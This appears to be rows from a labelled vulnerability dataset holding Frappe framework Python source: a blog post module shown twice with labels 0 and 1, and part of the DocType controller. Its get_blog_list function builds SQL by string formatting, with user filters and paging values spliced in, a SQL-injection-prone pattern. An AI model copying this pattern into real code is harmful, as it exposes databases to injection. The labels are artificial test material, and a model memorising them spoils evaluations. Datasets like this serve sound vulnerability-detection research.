			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc"""""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list(""""""select route from
		`tabBlog Post` where ifnull(published,0)=1""""""):
		clear_cache(blog)

	clear_cache(""writers"")

def get_blog_category(route):
	return frappe.db.get_value(""Blog Category"", {""name"": route}, ""title"") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger=""%s""' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category=""%s""' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like ""%{0}%"" or t1.title like ""%{0}%"")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """"""\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s"""""" % {
			""start"": limit_start, ""page_len"": limit_page_length,
				""condition"": ("" and "" + "" and "".join(conditions)) if conditions else """"
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or """"
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not ""http:"" in post.avatar and not ""https:"" in post.avatar) and not post.avatar.startswith(""/""):
			post.avatar = ""/"" + post.avatar

	return posts
/n/n/n",0
71,2fa19c25066ed17478d683666895e3266936aee6,"/frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = ""published_on desc""
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql(""""""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s"""""", (self.blogger,))

	def on_update(self):
		clear_cache(""writers"")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception(""This blog has not been published yet!"")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc(""Blogger"", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			""name"": self.title,
			""description"": context.description,
		}

		if ""<!-- markdown -->"" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags[""image""] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value(""Blog Category"",
			context.doc.blog_category, [""title"", ""route""], as_dict=1)
		context.parents = [{""name"": _(""Home""), ""route"":""/""},
			{""name"": ""Blog"", ""route"": ""/blog""},
			{""label"": context.category.title, ""route"":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = ""templates/includes/blog/blog.html"",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _(""Posts filed under {0}"").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value(""Blogger"", {""name"": frappe.local.form_dict.blogger}, ""full_name"")
		list_context.sub_title = _(""Posts by {0}"").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by ""{0}""').format(frappe.local.form_dict.txt)

	if list_context.sub_title:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""},
								{""name"": ""Blog"", ""route"": ""/blog""}]
	else:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""}]

	list_context.update(frappe.get_doc(""Blog Settings"", ""Blog Settings"").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql(""""""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc"""""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list(""""""select route from
		`tabBlog Post` where ifnull(published,0)=1""""""):
		clear_cache(blog)

	clear_cache(""writers"")

def get_blog_category(route):
	return frappe.db.get_value(""Blog Category"", {""name"": route}, ""title"") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger=""%s""' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category=""%s""' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like ""%{0}%"" or t1.title like ""%{0}%"")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """"""\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s"""""" % {
			""start"": limit_start, ""page_len"": limit_page_length,
				""condition"": ("" and "" + "" and "".join(conditions)) if conditions else """"
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or """"
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not ""http:"" in post.avatar and not ""https:"" in post.avatar) and not post.avatar.startswith(""/""):
			post.avatar = ""/"" + post.avatar

	return posts
/n/n/n",1
72,acd2f589b6cd2d1011be4a4e4965a1b3ed489c37,"frappe/core/doctype/doctype/doctype.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import six

import re, copy, os, subprocess
import frappe
from frappe import _

from frappe.utils import now, cint
from frappe.model import no_value_fields, default_fields
from frappe.model.document import Document
from frappe.custom.doctype.property_setter.property_setter import make_property_setter
from frappe.desk.notifications import delete_notification_count_for
from frappe.modules import make_boilerplate, get_doc_path
from frappe.model.db_schema import validate_column_name, validate_column_length, type_map
from frappe.model.docfield import supports_translation
import frappe.website.render

# imports - third-party imports
import pymysql
from pymysql.constants import ER

class InvalidFieldNameError(frappe.ValidationError): pass
class UniqueFieldnameError(frappe.ValidationError): pass
class IllegalMandatoryError(frappe.ValidationError): pass
class DoctypeLinkError(frappe.ValidationError): pass
class WrongOptionsDoctypeLinkError(frappe.ValidationError): pass
class HiddenAndMandatoryWithoutDefaultError(frappe.ValidationError): pass
class NonUniqueError(frappe.ValidationError): pass
class CannotIndexedError(frappe.ValidationError): pass
class CannotCreateStandardDoctypeError(frappe.ValidationError): pass

form_grid_templates = {
	""fields"": ""templates/form_grid/fields.html""
}

class DocType(Document):
	def get_feed(self):
		return self.name

	def validate(self):
		""""""Validate DocType before saving.

		- Check if developer mode is set.
		- Validate series
		- Check fieldnames (duplication etc)
		- Clear permission table for child tables
		- Add `amended_from` and `amended_by` if Amendable""""""

		self.check_developer_mode()

		self.validate_name()

		if self.issingle:
			self.allow_import = 0
			self.is_submittable = 0
			self.istable = 0

		elif self.istable:
			self.allow_import = 0
			self.permissions = []

		self.scrub_field_names()
		self.set_default_in_list_view()
		self.set_default_translatable()
		self.validate_series()
		self.validate_document_type()
		validate_fields(self)

		if self.istable:
			# no permission records for child table
			self.permissions = []
		else:
			validate_permissions(self)

		self.make_amendable()
		self.validate_website()

		if not self.is_new():
			self.before_update = frappe.get_doc('DocType', self.name)

		if not self.is_new():
			self.setup_fields_to_fetch()

		if self.default_print_format and not self.custom:
			frappe.throw(_('Standard DocType cannot have default print format, use Customize Form'))

	def set_default_in_list_view(self):
		'''Set default in-list-view for first 4 mandatory fields'''
		if not [d.fieldname for d in self.fields if d.in_list_view]:
			cnt = 0
			for d in self.fields:
				if d.reqd and not d.hidden and not d.fieldtype == ""Table"":
					d.in_list_view = 1
					cnt += 1
					if cnt == 4: break

	def set_default_translatable(self):
		'''Ensure that non-translatable never will be translatable'''
		for d in self.fields:
			if d.translatable and not supports_translation(d.fieldtype):
				d.translatable = 0

	def check_developer_mode(self):
		""""""Throw exception if not developer mode or via patch""""""
		if frappe.flags.in_patch or frappe.flags.in_test:
			return

		if not frappe.conf.get(""developer_mode"") and not self.custom:
			frappe.throw(_(""Not in Developer Mode! Set in site_config.json or make 'Custom' DocType.""), CannotCreateStandardDoctypeError)

	def setup_fields_to_fetch(self):
		'''Setup query to update values for newly set fetch values'''
		try:
			old_meta = frappe.get_meta(frappe.get_doc('DocType', self.name), cached=False)
			old_fields_to_fetch = [df.fieldname for df in old_meta.get_fields_to_fetch()]
		except frappe.DoesNotExistError:
			old_fields_to_fetch = []

		new_meta = frappe.get_meta(self, cached=False)

		self.flags.update_fields_to_fetch_queries = []

		if set(old_fields_to_fetch) != set([df.fieldname for df in new_meta.get_fields_to_fetch()]):
			for df in new_meta.get_fields_to_fetch():
				if df.fieldname not in old_fields_to_fetch:
					link_fieldname, source_fieldname = df.fetch_from.split('.', 1)
					link_df = new_meta.get_field(link_fieldname)

					self.flags.update_fields_to_fetch_queries.append('''update
							`tab{link_doctype}` source,
							`tab{doctype}` target
						set
							target.`{fieldname}` = source.`{source_fieldname}`
						where
							target.`{link_fieldname}` = source.name
							and ifnull(target.`{fieldname}`, '')="""" '''.format(
								link_doctype = link_df.options,
								source_fieldname = source_fieldname,
								doctype = self.name,
								fieldname = df.fieldname,
								link_fieldname = link_fieldname
					))

	def update_fields_to_fetch(self):
		'''Update fetch values based on queries setup'''
		if self.flags.update_fields_to_fetch_queries and not self.issingle:
			for query in self.flags.update_fields_to_fetch_queries:
				frappe.db.sql(query)

	def validate_document_type(self):
		if self.document_type==""Transaction"":
			self.document_type = ""Document""
		if self.document_type==""Master"":
			self.document_type = ""Setup""

	def validate_website(self):
		""""""Ensure that website generator has field 'route'""""""
		if self.has_web_view:
			# route field must be present
			if not 'route' in [d.fieldname for d in self.fields]:
				frappe.throw(_('Field ""route"" is mandatory for Web Views'), title='Missing Field')

			# clear website cache
			frappe.website.render.clear_cache()

	def change_modified_of_parent(self):
		""""""Change the timestamp of parent DocType if the current one is a child to clear caches.""""""
		if frappe.flags.in_import:
			return
		parent_list = frappe.db.sql(""""""SELECT parent
			from tabDocField where fieldtype=""Table"" and options=%s"""""", self.name)
		for p in parent_list:
			frappe.db.sql('UPDATE tabDocType SET modified=%s WHERE `name`=%s', (now(), p[0]))

	def scrub_field_names(self):
		""""""Sluggify fieldnames if not set from Label.""""""
		restricted = ('name','parent','creation','modified','modified_by',
			'parentfield','parenttype','file_list', 'flags', 'docstatus')
		for d in self.get(""fields""):
			if d.fieldtype:
				if (not getattr(d, ""fieldname"", None)):
					if d.label:
						d.fieldname = d.label.strip().lower().replace(' ','_')
						if d.fieldname in restricted:
							d.fieldname = d.fieldname + '1'
						if d.fieldtype=='Section Break':
							d.fieldname = d.fieldname + '_section'
						elif d.fieldtype=='Column Break':
							d.fieldname = d.fieldname + '_column'
					else:
						d.fieldname = d.fieldtype.lower().replace("" "",""_"") + ""_"" + str(d.idx)

				d.fieldname = re.sub('''['"",./%@()<>{}]''', '', d.fieldname)

				# fieldnames should be lowercase
				d.fieldname = d.fieldname.lower()

			# unique is automatically an index
			if d.unique: d.search_index = 0

	def validate_series(self, autoname=None, name=None):
		""""""Validate if `autoname` property is correctly set.""""""
		if not autoname: autoname = self.autoname
		if not name: name = self.name

		if not autoname and self.get(""fields"", {""fieldname"":""naming_series""}):
			self.autoname = ""naming_series:""

		# validate field name if autoname field:fieldname is used
		# Create unique index on autoname field automatically.
		if autoname and autoname.startswith('field:'):
			field = autoname.split("":"")[1]
			if not field or field not in [ df.fieldname for df in self.fields ]:
				frappe.throw(_(""Invalid fieldname '{0}' in autoname"".format(field)))
			else:
				for df in self.fields:
					if df.fieldname == field:
						df.unique = 1
						break

		if autoname and (not autoname.startswith('field:')) \
			and (not autoname.startswith('eval:')) \
			and (not autoname.lower() in ('prompt', 'hash')) \
			and (not autoname.startswith('naming_series:')):

			prefix = autoname.split('.')[0]
			used_in = frappe.db.sql('select name from tabDocType where substring_index(autoname, ""."", 1) = %s and name!=%s', (prefix, name))
			if used_in:
				frappe.throw(_(""Series {0} already used in {1}"").format(prefix, used_in[0][0]))

	def on_update(self):
		""""""Update database schema, make controller templates if `custom` is not set and clear cache.""""""
		from frappe.model.db_schema import updatedb
		self.delete_duplicate_custom_fields()
		try:
			updatedb(self.name, self)
		except Exception as e:
			print(""\n\nThere was an issue while migrating the DocType: {}\n"".format(self.name))
			raise e

		self.change_modified_of_parent()
		make_module_and_roles(self)

		self.update_fields_to_fetch()

		from frappe import conf
		if not self.custom and not (frappe.flags.in_import or frappe.flags.in_test) and conf.get('developer_mode'):
			self.export_doc()
			self.make_controller_template()

			if self.has_web_view:
				self.set_base_class_for_controller()

		# update index
		if not self.custom:
			self.run_module_method(""on_doctype_update"")
			if self.flags.in_insert:
				self.run_module_method(""after_doctype_insert"")

		delete_notification_count_for(doctype=self.name)
		frappe.clear_cache(doctype=self.name)

		if not frappe.flags.in_install and hasattr(self, 'before_update'):
			self.sync_global_search()

		# clear from local cache
		if self.name in frappe.local.meta_cache:
			del frappe.local.meta_cache[self.name]

		clear_linked_doctype_cache()

	def delete_duplicate_custom_fields(self):
		if not (frappe.db.table_exists(self.name) and frappe.db.table_exists(""Custom Field"")):
			return
		fields = [d.fieldname for d in self.fields if d.fieldtype in type_map]
		frappe.db.sql('''delete from
				`tabCustom Field`
			where
				 dt = {0} and fieldname in ({1})
		'''.format('%s', ', '.join(['%s'] * len(fields))), tuple([self.name] + fields), as_dict=True)

	def sync_global_search(self):
		'''If global search settings are changed, rebuild search properties for this table'''
		global_search_fields_before_update = [d.fieldname for d in
			self.before_update.fields if d.in_global_search]
		if self.before_update.show_name_in_global_search:
			global_search_fields_before_update.append('name')

		global_search_fields_after_update = [d.fieldname for d in
			self.fields if d.in_global_search]
		if self.show_name_in_global_search:
			global_search_fields_after_update.append('name')

		if set(global_search_fields_before_update) != set(global_search_fields_after_update):
			now = (not frappe.request) or frappe.flags.in_test or frappe.flags.in_install
			frappe.enqueue('frappe.utils.global_search.rebuild_for_doctype',
				now=now, doctype=self.name)

	def set_base_class_for_controller(self):
		'''Updates the controller class to subclass from `WebsiteGenertor`,
		if it is a subclass of `Document`'''
		controller_path = frappe.get_module_path(frappe.scrub(self.module),
			'doctype', frappe.scrub(self.name), frappe.scrub(self.name) + '.py')

		with open(controller_path, 'r') as f:
			code = f.read()

		class_string = '\nclass {0}(Document)'.format(self.name.replace(' ', ''))
		if '\nfrom frappe.model.document import Document' in code and class_string in code:
			code = code.replace('from frappe.model.document import Document',
				'from frappe.website.website_generator import WebsiteGenerator')
			code = code.replace('class {0}(Document)'.format(self.name.replace(' ', '')),
				'class {0}(WebsiteGenerator)'.format(self.name.replace(' ', '')))

		with open(controller_path, 'w') as f:
			f.write(code)


	def run_module_method(self, method):
		from frappe.modules import load_doctype_module
		module = load_doctype_module(self.name, self.module)
		if hasattr(module, method):
			getattr(module, method)()

	def before_rename(self, old, new, merge=False):
		""""""Throw exception if merge. DocTypes cannot be merged.""""""
		if not self.custom and frappe.session.user != ""Administrator"":
			frappe.throw(_(""DocType can only be renamed by Administrator""))

		self.check_developer_mode()
		self.validate_name(new)

		if merge:
			frappe.throw(_(""DocType can not be merged""))

		# Do not rename and move files and folders for custom doctype
		if not self.custom and not frappe.flags.in_test and not frappe.flags.in_patch:
			self.rename_files_and_folders(old, new)

	def after_rename(self, old, new, merge=False):
		""""""Change table name using `RENAME TABLE` if table exists. Or update
		`doctype` property for Single type.""""""
		if self.issingle:
			frappe.db.sql(""""""update tabSingles set doctype=%s where doctype=%s"""""", (new, old))
			frappe.db.sql(""""""update tabSingles set value=%s
				where doctype=%s and field='name' and value = %s"""""", (new, new, old))
		else:
			frappe.db.sql(""rename table `tab%s` to `tab%s`"" % (old, new))

	def rename_files_and_folders(self, old, new):
		# move files
		new_path = get_doc_path(self.module, 'doctype', new)
		subprocess.check_output(['mv', get_doc_path(self.module, 'doctype', old), new_path])

		# rename files
		for fname in os.listdir(new_path):
			if frappe.scrub(old) in fname:
				subprocess.check_output(['mv', os.path.join(new_path, fname),
					os.path.join(new_path, fname.replace(frappe.scrub(old), frappe.scrub(new)))])

		self.rename_inside_controller(new, old, new_path)
		frappe.msgprint('Renamed files and replaced code in controllers, please check!')

	def rename_inside_controller(self, new, old, new_path):
		for fname in ('{}.js', '{}.py', '{}_list.js', '{}_calendar.js', 'test_{}.py', 'test_{}.js'):
			fname = os.path.join(new_path, fname.format(frappe.scrub(new)))
			if os.path.exists(fname):
				with open(fname, 'r') as f:
					code = f.read()
				with open(fname, 'w') as f:
					f.write(code.replace(frappe.scrub(old).replace(' ', ''), frappe.scrub(new).replace(' ', '')))

	def before_reload(self):
		""""""Preserve naming series changes in Property Setter.""""""
		if not (self.issingle and self.istable):
			self.preserve_naming_series_options_in_property_setter()

	def preserve_naming_series_options_in_property_setter(self):
		""""""Preserve naming_series as property setter if it does not exist""""""
		naming_series = self.get(""fields"", {""fieldname"": ""naming_series""})

		if not naming_series:
			return

		# check if atleast 1 record exists
		if not (frappe.db.table_exists(self.name) and frappe.db.sql(""select name from `tab{}` limit 1"".format(self.name))):
			return

		existing_property_setter = frappe.db.get_value(""Property Setter"", {""doc_type"": self.name,
			""property"": ""options"", ""field_name"": ""naming_series""})

		if not existing_property_setter:
			make_property_setter(self.name, ""naming_series"", ""options"", naming_series[0].options, ""Text"", validate_fields_for_doctype=False)
			if naming_series[0].default:
				make_property_setter(self.name, ""naming_series"", ""default"", naming_series[0].default, ""Text"", validate_fields_for_doctype=False)

	def export_doc(self):
		""""""Export to standard folder `[module]/doctype/[name]/[name].json`.""""""
		from frappe.modules.export_file import export_to_files
		export_to_files(record_list=[['DocType', self.name]], create_init=True)

	def import_doc(self):
		""""""Import from standard folder `[module]/doctype/[name]/[name].json`.""""""
		from frappe.modules.import_module import import_from_files
		import_from_files(record_list=[[self.module, 'doctype', self.name]])

	def make_controller_template(self):
		""""""Make boilerplate controller template.""""""
		make_boilerplate(""controller._py"", self)

		if not self.istable:
			make_boilerplate(""test_controller._py"", self.as_dict())
			make_boilerplate(""controller.js"", self.as_dict())
			#make_boilerplate(""controller_list.js"", self.as_dict())
			if not os.path.exists(frappe.get_module_path(frappe.scrub(self.module),
				'doctype', frappe.scrub(self.name), 'tests')):
				make_boilerplate(""test_controller.js"", self.as_dict())

		if self.has_web_view:
			templates_path = frappe.get_module_path(frappe.scrub(self.module), 'doctype', frappe.scrub(self.name), 'templates')
			if not os.path.exists(templates_path):
				os.makedirs(templates_path)
			make_boilerplate('templates/controller.html', self.as_dict())
			make_boilerplate('templates/controller_row.html', self.as_dict())

	def make_amendable(self):
		""""""If is_submittable is set, add amended_from docfields.""""""
		if self.is_submittable:
			if not frappe.db.sql(""""""select name from tabDocField
				where fieldname = 'amended_from' and parent = %s"""""", self.name):
					self.append(""fields"", {
						""label"": ""Amended From"",
						""fieldtype"": ""Link"",
						""fieldname"": ""amended_from"",
						""options"": self.name,
						""read_only"": 1,
						""print_hide"": 1,
						""no_copy"": 1
					})

	def get_max_idx(self):
		""""""Returns the highest `idx`""""""
		max_idx = frappe.db.sql(""""""select max(idx) from `tabDocField` where parent = %s"""""",
			self.name)
		return max_idx and max_idx[0][0] or 0

	def validate_name(self, name=None):
		if not name:
			name = self.name

		# a DocType's name should not start with a number or underscore
		# and should only contain letters, numbers and underscore
		if six.PY2:
			is_a_valid_name = re.match(""^(?![\W])[^\d_\s][\w ]+$"", name)
		else:
			is_a_valid_name = re.match(""^(?![\W])[^\d_\s][\w ]+$"", name, flags = re.ASCII)
		if not is_a_valid_name:
			frappe.throw(_(""DocType's name should start with a letter and it can only consist of letters, numbers, spaces and underscores""), frappe.NameError)

def validate_fields_for_doctype(doctype):
	doc = frappe.get_doc(""DocType"", doctype)
	doc.delete_duplicate_custom_fields()
	validate_fields(frappe.get_meta(doctype, cached=False))

# this is separate because it is also called via custom field
def validate_fields(meta):
	""""""Validate doctype fields. Checks
	1. There are no illegal characters in fieldnames
	2. If fieldnames are unique.
	3. Validate column length.
	4. Fields that do have database columns are not mandatory.
	5. `Link` and `Table` options are valid.
	6. **Hidden** and **Mandatory** are not set simultaneously.
	7. `Check` type field has default as 0 or 1.
	8. `Dynamic Links` are correctly defined.
	9. Precision is set in numeric fields and is between 1 & 6.
	10. Fold is not at the end (if set).
	11. `search_fields` are valid.
	12. `title_field` and title field pattern are valid.
	13. `unique` check is only valid for Data, Link and Read Only fieldtypes.
	14. `unique` cannot be checked if there exist non-unique values.

	:param meta: `frappe.model.meta.Meta` object to check.""""""
	def check_illegal_characters(fieldname):
		validate_column_name(fieldname)

	def check_unique_fieldname(docname, fieldname):
		duplicates = list(filter(None, map(lambda df: df.fieldname==fieldname and str(df.idx) or None, fields)))
		if len(duplicates) > 1:
			frappe.throw(_(""{0}: Fieldname {1} appears multiple times in rows {2}"").format(docname, fieldname, "", "".join(duplicates)), UniqueFieldnameError)

	def check_fieldname_length(fieldname):
		validate_column_length(fieldname)

	def check_illegal_mandatory(docname, d):
		if (d.fieldtype in no_value_fields) and d.fieldtype!=""Table"" and d.reqd:
			frappe.throw(_(""{0}: Field {1} of type {2} cannot be mandatory"").format(docname, d.label, d.fieldtype), IllegalMandatoryError)

	def check_link_table_options(docname, d):
		if d.fieldtype in (""Link"", ""Table""):
			if not d.options:
				frappe.throw(_(""{0}: Options required for Link or Table type field {1} in row {2}"").format(docname, d.label, d.idx), DoctypeLinkError)
			if d.options==""[Select]"" or d.options==d.parent:
				return
			if d.options != d.parent:
				options = frappe.db.get_value(""DocType"", d.options, ""name"")
				if not options:
					frappe.throw(_(""{0}: Options must be a valid DocType for field {1} in row {2}"").format(docname, d.label, d.idx), WrongOptionsDoctypeLinkError)
				elif not (options == d.options):
					frappe.throw(_(""{0}: Options {1} must be the same as doctype name {2} for the field {3}"", DoctypeLinkError)
						.format(docname, d.options, options, d.label))
				else:
					# fix case
					d.options = options

	def check_hidden_and_mandatory(docname, d):
		if d.hidden and d.reqd and not d.default:
			frappe.throw(_(""{0}: Field {1} in row {2} cannot be hidden and mandatory without default"").format(docname, d.label, d.idx), HiddenAndMandatoryWithoutDefaultError)

	def check_width(d):
		if d.fieldtype == ""Currency"" and cint(d.width) < 100:
			frappe.throw(_(""Max width for type Currency is 100px in row {0}"").format(d.idx))

	def check_in_list_view(d):
		if d.in_list_view and (d.fieldtype in not_allowed_in_list_view):
			frappe.throw(_(""'In List View' not allowed for type {0} in row {1}"").format(d.fieldtype, d.idx))

	def check_in_global_search(d):
		if d.in_global_search and d.fieldtype in no_value_fields:
			frappe.throw(_(""'In Global Search' not allowed for type {0} in row {1}"")
				.format(d.fieldtype, d.idx))

	def check_dynamic_link_options(d):
		if d.fieldtype==""Dynamic Link"":
			doctype_pointer = list(filter(lambda df: df.fieldname==d.options, fields))
			if not doctype_pointer or (doctype_pointer[0].fieldtype not in (""Link"", ""Select"")) \
				or (doctype_pointer[0].fieldtype==""Link"" and doctype_pointer[0].options!=""DocType""):
				frappe.throw(_(""Options 'Dynamic Link' type of field must point to another Link Field with options as 'DocType'""))

	def check_illegal_default(d):
		if d.fieldtype == ""Check"" and d.default and d.default not in ('0', '1'):
			frappe.throw(_(""Default for 'Check' type of field must be either '0' or '1'""))
		if d.fieldtype == ""Select"" and d.default and (d.default not in d.options.split(""\n"")):
			frappe.throw(_(""Default for {0} must be an option"").format(d.fieldname))

	def check_precision(d):
		if d.fieldtype in (""Currency"", ""Float"", ""Percent"") and d.precision is not None and not (1 <= cint(d.precision) <= 6):
			frappe.throw(_(""Precision should be between 1 and 6""))

	def check_unique_and_text(docname, d):
		if meta.issingle:
			d.unique = 0
			d.search_index = 0

		if getattr(d, ""unique"", False):
			if d.fieldtype not in (""Data"", ""Link"", ""Read Only""):
				frappe.throw(_(""{0}: Fieldtype {1} for {2} cannot be unique"").format(docname, d.fieldtype, d.label), NonUniqueError)

			if not d.get(""__islocal""):
				try:
					has_non_unique_values = frappe.db.sql(""""""select `{fieldname}`, count(*)
						from `tab{doctype}` where ifnull({fieldname}, '') != ''
						group by `{fieldname}` having count(*) > 1 limit 1"""""".format(
						doctype=d.parent, fieldname=d.fieldname))

				except pymysql.InternalError as e:
					if e.args and e.args[0] == ER.BAD_FIELD_ERROR:
						# ignore if missing column, else raise
						# this happens in case of Custom Field
						pass
					else:
						raise

				else:
					# else of try block
					if has_non_unique_values and has_non_unique_values[0][0]:
						frappe.throw(_(""{0}: Field '{1}' cannot be set as Unique as it has non-unique values"").format(docname, d.label), NonUniqueError)

		if d.search_index and d.fieldtype in (""Text"", ""Long Text"", ""Small Text"", ""Code"", ""Text Editor""):
			frappe.throw(_(""{0}:Fieldtype {1} for {2} cannot be indexed"").format(docname, d.fieldtype, d.label), CannotIndexedError)

	def check_fold(fields):
		fold_exists = False
		for i, f in enumerate(fields):
			if f.fieldtype==""Fold"":
				if fold_exists:
					frappe.throw(_(""There can be only one Fold in a form""))
				fold_exists = True
				if i < len(fields)-1:
					nxt = fields[i+1]
					if nxt.fieldtype != ""Section Break"":
						frappe.throw(_(""Fold must come before a Section Break""))
				else:
					frappe.throw(_(""Fold can not be at the end of the form""))

	def check_search_fields(meta, fields):
		""""""Throw exception if `search_fields` don't contain valid fields.""""""
		if not meta.search_fields:
			return

		# No value fields should not be included in search field
		search_fields = [field.strip() for field in (meta.search_fields or """").split("","")]
		fieldtype_mapper = { field.fieldname: field.fieldtype \
			for field in filter(lambda field: field.fieldname in search_fields, fields) }

		for fieldname in search_fields:
			fieldname = fieldname.strip()
			if (fieldtype_mapper.get(fieldname) in no_value_fields) or \
				(fieldname not in fieldname_list):
				frappe.throw(_(""Search field {0} is not valid"").format(fieldname))

	def check_title_field(meta):
		""""""Throw exception if `title_field` isn't a valid fieldname.""""""
		if not meta.get(""title_field""):
			return

		if meta.title_field not in fieldname_list:
			frappe.throw(_(""Title field must be a valid fieldname""), InvalidFieldNameError)

		def _validate_title_field_pattern(pattern):
			if not pattern:
				return

			for fieldname in re.findall(""{(.*?)}"", pattern, re.UNICODE):
				if fieldname.startswith(""{""):
					# edge case when double curlies are used for escape
					continue

				if fieldname not in fieldname_list:
					frappe.throw(_(""{{{0}}} is not a valid fieldname pattern. It should be {{field_name}}."").format(fieldname),
						InvalidFieldNameError)

		df = meta.get(""fields"", filters={""fieldname"": meta.title_field})[0]
		if df:
			_validate_title_field_pattern(df.options)
			_validate_title_field_pattern(df.default)

	def check_image_field(meta):
		'''check image_field exists and is of type ""Attach Image""'''
		if not meta.image_field:
			return

		df = meta.get(""fields"", {""fieldname"": meta.image_field})
		if not df:
			frappe.throw(_(""Image field must be a valid fieldname""), InvalidFieldNameError)
		if df[0].fieldtype != 'Attach Image':
			frappe.throw(_(""Image field must be of type Attach Image""), InvalidFieldNameError)

	def check_is_published_field(meta):
		if not meta.is_published_field:
			return

		if meta.is_published_field not in fieldname_list:
			frappe.throw(_(""Is Published Field must be a valid fieldname""), InvalidFieldNameError)

	def check_timeline_field(meta):
		if not meta.timeline_field:
			return

		if meta.timeline_field not in fieldname_list:
			frappe.throw(_(""Timeline field must be a valid fieldname""), InvalidFieldNameError)

		df = meta.get(""fields"", {""fieldname"": meta.timeline_field})[0]
		if df.fieldtype not in (""Link"", ""Dynamic Link""):
			frappe.throw(_(""Timeline field must be a Link or Dynamic Link""), InvalidFieldNameError)

